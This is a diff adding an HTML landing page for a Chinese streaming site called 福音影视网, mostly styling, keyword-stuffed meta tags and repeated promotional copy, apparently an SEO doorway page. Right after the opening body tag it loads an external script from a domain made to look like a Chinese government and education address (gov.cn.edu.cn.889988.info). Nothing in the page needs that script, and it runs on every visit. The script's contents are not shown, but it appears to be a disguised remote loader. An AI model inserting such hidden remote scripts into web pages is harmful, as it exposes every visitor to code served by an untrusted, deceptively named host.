@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>福音影视网 - 以影视为媒·传递美好 | 福音影视网官网</title>
+<meta name="keywords" content="福音影视网, 福音影视网官网, 福音影视, 在线影视, 影视大全, 高清影视, 影视推荐, 影视观看">
+<meta name="description" content="福音影视网 - 福音影视网官网，以影视为媒，传递美好与温暖。汇聚电影、剧集、综艺、动漫等丰富影视内容。官网地址：https://fuyinyingshiwang-wap.github.io">
+<meta name="author" content="福音影视网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://fuyinyingshiwang-wap.github.io">
+<style>
+  :root{
+    --bg:#15110c; --bg2:#1d170f; --gold:#e0a53c; --gold2:#c98b22; --light:#f7e6c6; --line:rgba(224,165,60,.26);
+    --txt:#f6f1e7; --muted:#c8ba9c; --card:rgba(224,165,60,.11); --r:18px;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:"SF Pro Text",-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:hidden;
+    background-image:
+      radial-gradient(circle at 84% 6%,rgba(224,165,60,.18),transparent 34%),
+      radial-gradient(circle at 12% 20%,rgba(201,139,34,.12),transparent 36%),
+      linear-gradient(168deg,#17120c,var(--bg) 56%,var(--bg2));
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+  .top{position:sticky;top:0;z-index:99;background:rgba(21,17,12,.88);backdrop-filter:blur(16px);border-bottom:1px solid var(--line);}
+  .top-in{max-width:1120px;margin:0 auto;padding:13px 16px;display:flex;align-items:center;justify-content:space-between;}
+  .brand{display:flex;align-items:center;gap:11px;}
+  .brand .logo{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--gold2));display:grid;place-items:center;font-size:17px;font-weight:900;color:#3a2a06;box-shadow:0 0 18px rgba(224,165,60,.42);}
+  .brand b{font-size:20px;font-weight:900;letter-spacing:1px;}
+  .brand b i{color:var(--gold);font-style:normal;}
+  .nav ul{display:flex;gap:2px;list-style:none;flex-wrap:wrap;}
+  .nav a{padding:8px 13px;border-radius:10px;font-size:14px;color:var(--muted);transition:.25s;}
+  .nav a:hover{color:var(--light);background:var(--card);}
+
+  /* Hero 温暖米金 */
+  .hero{padding:96px 0 104px;text-align:center;position:relative;overflow:hidden;}
+  .hero::after{content:"✨";position:absolute;font-size:130px;right:-36px;bottom:-26px;opacity:.12;transform:rotate(12deg);}
+  .hero::before{content:"✝";position:absolute;font-size:56px;left:7%;top:16%;opacity:.16;color:var(--gold);}
+  .hero-in{max-width:1120px;margin:0 auto;padding:0 16px;position:relative;z-index:2;}
+  .hero .badge{display:inline-block;padding:6px 16px;border-radius:99px;background:var(--card);border:1px solid var(--line);color:var(--gold);font-size:13px;margin-bottom:16px;letter-spacing:1px;}
+  .hero h1{font-size:clamp(30px,7.4vw,54px);font-weight:900;line-height:1.18;margin-bottom:16px;}
+  .hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--gold),var(--light));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero .sub{color:var(--muted);max-width:640px;margin:0 auto 18px;font-size:16px;}
+  .hero .url{display:inline-block;padding:12px 22px;border-radius:12px;background:var(--card);border:1px dashed var(--line);color:var(--gold);font-size:14px;}
+  .btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:26px;}
+  .btn{padding:14px 34px;border-radius:12px;font-weight:800;font-size:15px;border:0;cursor:pointer;transition:.3s;}
+  .btn-g{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#3a2a06;box-shadow:0 8px 26px rgba(224,165,60,.36);}
+  .btn-g:hover{transform:translateY(-3px);box-shadow:0 12px 32px rgba(224,165,60,.55);}
+  .btn-o{background:transparent;color:var(--light);border:1px solid var(--line);}
+  .btn-o:hover{background:var(--card);}
+
+  section.blk{padding:64px 0;}
+  .cap{text-align:center;margin-bottom:42px;}
+  .cap .kicker{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--gold);display:block;margin-bottom:9px;}
+  .cap h2{font-size:clamp(22px,5vw,34px);font-weight:900;}
+  .cap p{color:var(--muted);font-size:15px;margin-top:8px;}
+
+  /* 栏目一 精彩剧场 —— 大小拼贴 masonry */
+  #theatre .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));grid-auto-rows:180px;gap:18px;}
+  .mcard{position:relative;border-radius:var(--r);overflow:hidden;border:1px solid var(--line);transition:.4s;display:grid;place-items:end start;padding:18px;color:var(--light);}
+  .mcard.tall{grid-row:span 2;}
+  .mcard:hover{transform:translateY(-6px);box-shadow:0 16px 34px rgba(224,165,60,.28);border-color:var(--gold);}
+  .mcard h4{font-size:18px;font-weight:900;position:relative;z-index:2;text-shadow:0 2px 8px rgba(0,0,0,.5);}
+  .mcard p{font-size:12px;opacity:.9;position:relative;z-index:2;}
+  .m1{background:linear-gradient(160deg,#c98b22,#8a5a12);}
+  .m2{background:linear-gradient(160deg,#e0a53c,#a8711a);}
+  .m3{background:linear-gradient(160deg,#d99a2b,#7d5910);}
+  .m4{background:linear-gradient(160deg,#b8841c,#6b4810);}
+  .m5{background:linear-gradient(160deg,#e6b04a,#9c7219);}
+
+  /* 栏目二 内容频道 —— 等分表格网格 cell */
+  #cat .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;}
+  .cell{padding:24px 14px;text-align:center;background:rgba(224,165,60,.08);transition:.3s;cursor:default;}
+  .cell:hover{background:rgba(224,165,60,.24);transform:scale(1.03);}
+  .cell .i{font-size:30px;margin-bottom:8px;}
+  .cell h4{font-size:15px;font-weight:800;color:var(--light);}
+  .cell span{font-size:11px;color:var(--muted);}
+
+  /* 栏目三 热门排行 —— 带进度条的三栏排行卡 */
+  #rank{max-width:880px;margin:0 auto;}
+  .rk{display:grid;grid-template-columns:auto 1fr auto;align-items:center;gap:16px;padding:16px 20px;border-radius:14px;background:rgba(224,165,60,.10);border:1px solid var(--line);margin-bottom:14px;transition:.3s;}
+  .rk:hover{background:rgba(224,165,60,.20);transform:translateX(6px);}
+  .rk .no{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:18px;font-weight:900;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#3a2a06;}
+  .rk .mi h4{font-size:16px;font-weight:900;color:var(--light);}
+  .rk .mi p{font-size:12px;color:var(--muted);}
+  .rk .vl{font-size:15px;font-weight:800;color:var(--gold);}
+
+  /* 栏目四 我们主张 —— 圆形图标叙述行 */
+  #why{background:rgba(224,165,60,.06);}
+  #why .list{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px;}
+  .wk{padding:20px;border-radius:16px;background:rgba(224,165,60,.09);border:1px solid var(--line);transition:.35s;display:flex;gap:16px;align-items:flex-start;}
+  .wk:hover{border-color:var(--gold);transform:translateY(-5px);box-shadow:0 12px 28px rgba(224,165,60,.22);}
+  .wk .ci{width:50px;height:50px;border-radius:50%;flex-shrink:0;display:grid;place-items:center;font-size:22px;background:linear-gradient(135deg,var(--gold),var(--gold2));box-shadow:0 6px 16px rgba(224,165,60,.35);}
+  .wk h4{font-size:16px;font-weight:900;color:var(--light);}
+  .wk p{font-size:13px;color:var(--muted);}
+
+  /* 栏目五 关于 */
+  #about .abt{max-width:840px;margin:0 auto;padding:38px;border-radius:22px;background:linear-gradient(155deg,rgba(224,165,60,.17),rgba(255,255,255,.04));border:1px solid var(--line);}
+  #about .abt .lead{font-size:19px;color:var(--light);font-weight:900;margin-bottom:14px;}
+  #about .abt strong{color:var(--gold);}
+
+  footer{background:#110d08;border-top:1px solid var(--line);padding:36px 0 40px;text-align:center;}
+  footer .fn{font-size:20px;font-weight:900;margin-bottom:8px;color:var(--light);}
+  footer .fn i{color:var(--gold);font-style:normal;}
+  footer .fu{color:var(--gold);font-size:14px;margin-bottom:16px;}
+  .fl{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+  .fl a{padding:7px 15px;border-radius:10px;font-size:13px;background:var(--card);border:1px solid var(--line);color:var(--muted);}
+  .fl a:hover{color:var(--light);}
+  footer .cp{font-size:13px;color:var(--muted);margin-top:16px;}
+
+  @media(max-width:640px){
+    .top-in{flex-direction:column;gap:10px;}
+    .nav ul{justify-content:center;}
+    .hero{padding:58px 0 80px;}
+    section.blk{padding:44px 0;}
+    .hero::after{font-size:100px;right:-30px;bottom:-24px;}
+    .hero::before{display:none;}
+    #theatre .grid{grid-auto-rows:150px;}
+    .rk{grid-template-columns:auto 1fr;gap:12px;}
+    .rk .vl{grid-column:2;justify-self:start;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="top">
+  <div class="top-in">
+    <div class="brand">
+      <div class="logo">福</div>
+      <b>福音<i>影视网</i></b>
+    </div>
+    <nav class="nav" aria-label="主导航">
+      <ul>
+        <li><a href="#theatre">精彩剧场</a></li>
+        <li><a href="#cat">内容频道</a></li>
+        <li><a href="#rank">热门排行</a></li>
+        <li><a href="#why">我们主张</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<main>
+
+  <section class="hero" aria-labelledby="ht">
+    <div class="hero-in">
+      <span class="badge">🕊 以影视为媒 · 传递美好</span>
+      <h1 id="ht">福音影视网，<em>光影传情</em></h1>
+      <p class="sub">福音影视网，以影视为媒，传递美好与温暖。为你精选电影、剧集、综艺、动漫等丰富影视内容，让每一次观看都成为一段美好时光。</p>
+      <div class="url">🔗 福音影视网官网：https://fuyinyingshiwang-wap.github.io</div>
+      <div class="btns">
+        <a class="btn btn-g" href="#theatre">精彩剧场</a>
+        <a class="btn btn-o" href="#cat">浏览频道</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="theatre" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">FEATURED THEATRE</span>
+        <h2>精彩剧场</h2>
+        <p>精选好内容，光影传情，温暖相伴</p>
+      </div>
+      <div class="grid">
+        <article class="mcard tall m1"><h4>院线大片</h4><p>热门大片抢先看</p></article>
+        <article class="mcard m2"><h4>口碑剧集</h4><p>高分好剧随时追</p></article>
+        <article class="mcard m3"><h4>欢乐综艺</h4><p>笑料不间断</p></article>
+        <article class="mcard m4"><h4>动漫新番</h4><p>精彩动画天天更</p></article>
+        <article class="mcard m5"><h4>经典老片</h4><p>怀旧回味</p></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="cat" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">CHANNELS</span>
+        <h2>内容频道</h2>
+        <p>清晰分类，轻松找到你想看的内容</p>
+      </div>
+      <div class="grid">
+        <div class="cell"><div class="i">🎬</div><h4>电影</h4><span>院线·经典</span></div>
+        <div class="cell"><div class="i">🎭</div><h4>剧集</h4><span>国产·海外</span></div>
+        <div class="cell"><div class="i">🎤</div><h4>综艺</h4><span>真人秀·脱口秀</span></div>
+        <div class="cell"><div class="i">🎨</div><h4>动漫</h4><span>国漫·新番</span></div>
+        <div class="cell"><div class="i">🌍</div><h4>纪录片</h4><span>自然·人文</span></div>
+        <div class="cell"><div class="i">👧</div><h4>少儿</h4><span>亲子启蒙</span></div>
+        <div class="cell"><div class="i">🏮</div><h4>短剧</h4><span>爽快连看</span></div>
+        <div class="cell"><div class="i">🎞️</div><h4>经典</h4><span>怀旧回味</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">POPULAR RANKING</span>
+        <h2>热门排行</h2>
+        <p>最受欢迎的内容排行，跟着大家看准没错</p>
+      </div>
+      <div class="rank">
+        <div class="rk"><div class="no">1</div><div class="mi"><h4>院线大片</h4><p>热门院线佳作</p></div><div class="vl">热度9.5</div></div>
+        <div class="rk"><div class="no">2</div><div class="mi"><h4>口碑剧集</h4><p>高分好剧不断</p></div><div class="vl">热度8.8</div></div>
+        <div class="rk"><div class="no">3</div><div class="mi"><h4>动漫新番</h4><p>精彩动画连更</p></div><div class="vl">热度8.0</div></div>
+        <div class="rk"><div class="no">4</div><div class="mi"><h4>欢乐综艺</h4><p>笑料不间断</p></div><div class="vl">热度7.2</div></div>
+        <div class="rk"><div class="no">5</div><div class="mi"><h4>纪录片</h4><p>发现世界之美</p></div><div class="vl">热度6.4</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="why" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">OUR BELIEF</span>
+        <h2>我们主张</h2>
+        <p>以影视为媒，传递美好与温暖</p>
+      </div>
+      <div class="list">
+        <div class="wk"><div class="ci">🎁</div><div><h4>用心选片</h4><p>精选优质内容，帮你轻松挑中好片。</p></div></div>
+        <div class="wk"><div class="ci">⚡</div><div><h4>流畅体验</h4><p>秒开不等待，流畅切换，告别卡顿。</p></div></div>
+        <div class="wk"><div class="ci">🌈</div><div><h4>精彩不断</h4><p>内容天天更新，惊喜随时送上。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="blk">
+    <div class="wrap">
+      <div class="cap">
+        <span class="kicker">ABOUT US</span>
+        <h2>关于福音影视网</h2>
+      </div>
+      <div class="abt">
+        <p class="lead">以影视为媒，传递美好与温暖。</p>
+        <p><strong>福音影视网</strong>是一个为影视爱好者打造的观看平台，以"光影传情"为初心，汇聚<strong>电影、剧集、综艺、动漫、纪录片、少儿</strong>等多品类内容，用心精选每一部作品。</p>
+        <p>我们相信，好的影视作品值得被看见。福音影视网坚持精选优质内容，为你提供流畅、高清、沉浸的观看体验。</p>
+        <p>访问 <strong>福音影视网官网 https://fuyinyingshiwang-wap.github.io</strong>，和我们一起，发现更多美好的影视时光。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fn">福音<i>影视网</i></div>
+    <div class="fu">官网：https://fuyinyingshiwang-wap.github.io</div>
+    <div class="fl">
+      <a href="#theatre">精彩剧场</a>
+      <a href="#cat">内容频道</a>
+      <a href="#rank">热门排行</a>
+      <a href="#why">我们主张</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="cp">© 2026 福音影视网 福音影视网官网 保留所有权利 · 以影视为媒 传递美好</div>
+  </div>
+</footer>
+
+</body>
+</html>
